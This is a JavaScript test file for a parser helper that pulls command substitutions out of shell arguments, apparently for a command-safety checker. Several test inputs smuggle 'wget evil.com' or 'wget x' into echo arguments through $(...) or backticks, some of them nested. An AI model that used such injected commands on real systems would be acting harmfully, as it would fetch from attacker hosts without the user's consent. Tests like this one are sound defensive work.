import { parse } from 'unbash';
import { extractCommandSubstitutions } from '../extractCommandSubstitutions.js';

describe('extractCommandSubstitutions', () => {
  /**
   * Parse a command line and return the first argument word
   * @param {string} commandLine - The command line to parse
   * @returns {object} The first argument word node
   */
  function firstArgument(commandLine) {
    return parse(commandLine).commands[0].command.suffix[0];
  }

  it.each([
    {
      title: 'double-quoted substitution',
      commandLine: 'echo "$(wget evil.com)"',
      expected: [
        { innerCommandLine: 'wget evil.com', span: { start: 6, end: 22 } },
      ],
    },
    {
      title: 'unquoted substitution',
      commandLine: 'echo $(wget evil.com)',
      expected: [
        { innerCommandLine: 'wget evil.com', span: { start: 5, end: 21 } },
      ],
    },
    {
      title: 'unquoted backticks',
      commandLine: 'echo `wget x`',
      expected: [{ innerCommandLine: 'wget x', span: { start: 5, end: 13 } }],
    },
    {
      title: 'double-quoted backticks',
      commandLine: 'echo "`wget x`"',
      expected: [{ innerCommandLine: 'wget x', span: { start: 6, end: 14 } }],
    },
    {
      title: 'nested backticks drop their escapes',
      commandLine: 'echo `echo \\`wget x\\``',
      expected: [
        { innerCommandLine: 'echo `wget x`', span: { start: 5, end: 22 } },
      ],
    },
    {
      title: 'nested substitution keeps its inner text whole',
      commandLine: 'echo "$(echo "$(wget x)")"',
      expected: [
        {
          innerCommandLine: 'echo "$(wget x)"',
          span: { start: 6, end: 25 },
        },
      ],
    },
    {
      title: 'substitution surrounded by text',
      commandLine: 'echo "before $(wget x) after"',
      expected: [{ innerCommandLine: 'wget x', span: { start: 13, end: 22 } }],
    },
    {
      title: 'two identical substitutions',
      commandLine: 'echo "$(a) $(a)"',
      expected: [
        { innerCommandLine: 'a', span: { start: 6, end: 10 } },
        { innerCommandLine: 'a', span: { start: 11, end: 15 } },
      ],
    },
    {
      title: 'escaped substitution before a real one',
      commandLine: 'echo "\\$(a) $(a)"',
      expected: [{ innerCommandLine: 'a', span: { start: 12, end: 16 } }],
    },
    {
      title: 'single-quoted text',
      commandLine: "echo '$(wget x)'",
      expected: [],
    },
    {
      title: 'word without substitution',
      commandLine: 'echo hello',
      expected: [],
    },
  ])('$title', ({ commandLine, expected }) => {
    const actual = extractCommandSubstitutions(firstArgument(commandLine));
    expect(actual).toEqual(expected);
  });
});
